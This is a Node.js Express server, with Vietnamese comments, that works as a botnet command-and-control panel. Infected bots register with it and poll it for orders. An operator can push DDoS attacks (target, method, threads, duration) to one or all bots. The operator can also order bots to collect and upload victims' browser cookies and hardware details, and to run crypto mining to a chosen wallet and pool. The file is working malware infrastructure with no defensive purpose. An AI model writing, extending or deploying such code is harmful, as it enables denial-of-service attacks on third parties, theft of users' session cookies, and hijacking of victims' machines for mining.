const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

app.use(express.json());
app.use(express.static('public'));
app.use('/methods', express.static('methods'));

// ===== DỮ LIỆU =====
let bots = {};
let pendingCommands = {};
let attackLog = [];

// ===== BOT ĐĂNG KÝ =====
app.post('/api/register', (req, res) => {
    const { id, hostname, ip } = req.body;
    bots[id] = {
        id: id,
        hostname: hostname || 'Unknown',
        ip: ip || req.ip,
        online: true,
        status: 'ONLINE',
        lastSeen: new Date()
    };
    console.log('Bot registered:', id);
    res.json({ ok: true });
});

// ===== BOT CHECK LỆNH =====
app.post('/api/check', (req, res) => {
    const { id } = req.body;
    
    if (bots[id]) {
        bots[id].lastSeen = new Date();
        bots[id].online = true;
    }
    
    let cmd = pendingCommands['ALL'] || pendingCommands[id] || null;
    if (cmd) {
        if (pendingCommands['ALL']) delete pendingCommands['ALL'];
        if (pendingCommands[id]) delete pendingCommands[id];
    }
    
    res.json(cmd || { action: 'none' });
});

// ===== BOT BÁO CÁO =====
app.post('/api/report', (req, res) => {
    const { id, status, target, method } = req.body;
    if (bots[id]) {
        bots[id].status = status || 'ONLINE';
        bots[id].target = target || '';
        bots[id].method = method || '';
        bots[id].lastSeen = new Date();
    }
    res.json({ ok: true });
});

// ===== PANEL GỬI LỆNH TẤN CÔNG =====
app.post('/api/attack', (req, res) => {
    const { botId, layer, method, target, threads, duration } = req.body;
    
    const cmd = {
        layer: layer,
        method: method,
        target: target,
        threads: parseInt(threads),
        duration: parseInt(duration)
    };
    
    if (botId === 'ALL') {
        pendingCommands['ALL'] = cmd;
    } else if (botId) {
        pendingCommands[botId] = cmd;
    }
    
    res.json({ ok: true, sent: botId || 'ALL' });
});

// ===== PANEL DỪNG TẤN CÔNG =====
app.post('/api/stop', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') {
        pendingCommands['ALL'] = { action: 'stop' };
    } else if (botId) {
        pendingCommands[botId] = { action: 'stop' };
    }
    res.json({ ok: true });
});

// ===== XEM DANH SÁCH BOT =====
app.get('/api/bots', (req, res) => {
    res.json(bots);
});

// ===== XEM METHODS =====
app.get('/api/methods', (req, res) => {
    const files = fs.readdirSync('./methods');
    res.json(files);
});

// ===== PANEL HTML =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

// ===== LẤY THÔNG TIN BOT =====
app.post('/api/getinfo', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') {
        pendingCommands['ALL'] = { action: 'getinfo' };
    } else if (botId) {
        pendingCommands[botId] = { action: 'getinfo' };
    }
    res.json({ ok: true });
});

// ===== LẤY COOKIE =====
app.post('/api/cookies', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') {
        pendingCommands['ALL'] = { action: 'getcookies' };
    } else if (botId) {
        pendingCommands[botId] = { action: 'getcookies' };
    }
    res.json({ ok: true });
});

// ===== ĐÀO COIN =====
app.post('/api/mining', (req, res) => {
    const { botId, action, wallet, pool, threads, priority } = req.body;
    const cmd = { action, wallet, pool, threads, priority };
    if (botId === 'ALL') {
        pendingCommands['ALL'] = cmd;
    } else if (botId) {
        pendingCommands[botId] = cmd;
    }
    res.json({ ok: true });
});

// ===== BOT BÁO CÁO THÔNG TIN =====
app.post('/api/reportinfo', (req, res) => {
    const { id, cpu, ram, gpu, cookies } = req.body;
    if (bots[id]) {
        bots[id].cpu = cpu;
        bots[id].ram = ram;
        bots[id].gpu = gpu;
        bots[id].cookies = cookies;
        bots[id].lastSeen = new Date();
    }
    res.json({ ok: true });
});

// ===== START =====
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
